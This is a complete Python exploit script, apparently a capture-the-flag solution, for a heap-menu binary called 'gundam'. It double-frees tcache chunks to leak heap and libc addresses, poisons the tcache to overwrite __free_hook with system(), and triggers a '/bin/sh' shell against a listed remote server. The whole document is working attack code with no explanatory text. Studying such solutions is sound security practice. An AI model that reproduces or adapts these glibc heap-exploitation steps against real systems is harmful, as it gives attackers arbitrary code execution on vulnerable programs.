#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file    = './gundam'
libc_file   = './libc.so.6'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':8080}, \
                        remote  = {'host':'47.75.37.114', 'port':9999})
env.select()

#==========

binf = ELF(bin_file)
libc = ELF(libc_file)
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    gd = Gundam(conn)

    gd.build('0', 0)    # 0
    gd.build('1', 0)    # 1
    for _ in range(7):
        gd.destroy(0)

    gd.build('\x90', 0) # 2
    addr_heap_base      = u(gd.visit()[1][11:].split('Type')[0]) - 0x290
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(2):
        gd.destroy(0)

    gd.blow()
    gd.build('\x78', 0) # 0
    addr_libc_mainarena = u(gd.visit()[0][11:].split('Type')[0]) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_system        = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    gd.build('\x00', 0) # 3

    for _ in range(2):
        gd.destroy(1)

    gd.build(p64(addr_libc_free_hook), 0)   # 4
    gd.build('/bin/sh', 0)                  # 5
    gd.build(p64(addr_libc_system), 0)      # 6
    
    gd.destroy(5)

class Gundam:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def build(self, name, type):
        self.sendlineafter('choice : ', '1')
        self.sendafter('gundam :', name)
        self.sendlineafter('gundam :', str(type))

    def visit(self):
        self.sendlineafter('choice : ', '2')
        return self.recvuntil('1 . Build a gundam')[1:].split('\n\n')[0:-1]

    def destroy(self, index):
        self.sendlineafter('choice : ', '3')
        self.sendlineafter('Destory:', str(index))

    def blow(self):
        self.sendlineafter('choice : ', '4')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
